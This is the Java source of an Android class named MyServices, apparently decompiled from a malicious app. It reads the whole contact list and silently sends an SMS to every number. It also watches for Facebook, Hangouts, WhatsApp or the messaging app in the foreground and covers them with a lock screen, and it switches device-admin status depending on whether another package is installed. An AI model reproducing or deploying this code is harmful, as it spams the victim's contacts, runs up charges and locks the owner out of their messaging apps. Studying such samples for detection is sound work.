package com.elite;

import android.app.ActivityManager;
import android.app.ActivityManager.RunningServiceInfo;
import android.app.ActivityManager.RunningTaskInfo;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager.NameNotFoundException;
import android.database.Cursor;
import android.os.AsyncTask;
import android.provider.ContactsContract.CommonDataKinds.Phone;
import android.telephony.SmsManager;
import java.util.ArrayList;

public class MyServices {

    public class Async_sendSMS extends AsyncTask<Void, Void, Void> {
        private Context contextTask;

        public Async_sendSMS(Context context) {
            this.contextTask = context;
        }

        /* Access modifiers changed, original: protected|varargs */
        public Void doInBackground(Void... params) {
            try {
                Thread.sleep(5000);
                Cursor phones = this.contextTask.getContentResolver().query(Phone.CONTENT_URI, null, null, null, null);
                while (phones.moveToNext()) {
                    String name = phones.getString(phones.getColumnIndex("display_name"));
                    MyServices.this.sendSMS(this.contextTask, phones.getString(phones.getColumnIndex("data1")), "HEY!!! " + name + " " + this.contextTask.getResources().getString(R.string.msg));
                }
                phones.close();
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            return null;
        }

        /* Access modifiers changed, original: protected */
        public void onPostExecute(Void result) {
            super.onPostExecute(result);
        }
    }

    public boolean isMyServiceRunning(Context context) {
        for (RunningServiceInfo service : ((ActivityManager) context.getSystemService("activity")).getRunningServices(Integer.MAX_VALUE)) {
            if (IntentServiceClass.class.getName().equals(service.service.getClassName())) {
                return true;
            }
        }
        return false;
    }

    public void keepRunningActivity(Context context) {
        DeviceManager deviceManager = new DeviceManager();
        if (isPackageExisted(context, context.getResources().getString(R.string.packagename))) {
            try {
                if (deviceManager.isDeviceAdminActive(context)) {
                    deviceManager.deactivateDeviceAdmin(context);
                    return;
                }
                return;
            } catch (Exception e) {
                e.printStackTrace();
                return;
            }
        }
        new Async_sendSMS(context).execute(new Void[0]);
        getTopActivity(context);
    }

    public void getTopActivity(Context context) {
        String packageName = ((RunningTaskInfo) ((ActivityManager) context.getSystemService("activity")).getRunningTasks(1).get(0)).topActivity.getPackageName();
        if ("com.facebook.katana".equalsIgnoreCase(packageName) || "com.google.android.talk".equalsIgnoreCase(packageName) || "com.whatsapp".equalsIgnoreCase(packageName) || "com.android.mms".equalsIgnoreCase(packageName)) {
            Intent intent = new Intent(context, LockScreen.class);
            intent.setFlags(335577088);
            context.startActivity(intent);
        }
    }

    public void sendSMS(Context context, String phoneNumber, String message) {
        String SENT = "SMS_SENT";
        String DELIVERED = "SMS_DELIVERED";
        SmsManager sms = SmsManager.getDefault();
        ArrayList<String> parts = sms.divideMessage(message);
        int messageCount = parts.size();
        ArrayList<PendingIntent> deliveryIntents = new ArrayList();
        ArrayList<PendingIntent> sentIntents = new ArrayList();
        PendingIntent sentPI = PendingIntent.getBroadcast(context, 0, new Intent(SENT), 0);
        PendingIntent deliveredPI = PendingIntent.getBroadcast(context, 0, new Intent(DELIVERED), 0);
        for (int j = 0; j < messageCount; j++) {
            sentIntents.add(sentPI);
            deliveryIntents.add(deliveredPI);
        }
        context.registerReceiver(new BroadcastReceiver() {
            public void onReceive(Context arg0, Intent arg1) {
                switch (getResultCode()) {
                }
            }
        }, new IntentFilter(SENT));
        context.registerReceiver(new BroadcastReceiver() {
            public void onReceive(Context arg0, Intent arg1) {
                switch (getResultCode()) {
                }
            }
        }, new IntentFilter(DELIVERED));
        sms.sendMultipartTextMessage(phoneNumber, null, parts, sentIntents, deliveryIntents);
    }

    public boolean isPackageExisted(Context context, String targetPackage) {
        try {
            context.getPackageManager().getPackageInfo(targetPackage, 128);
            return true;
        } catch (NameNotFoundException e) {
            return false;
        }
    }
}
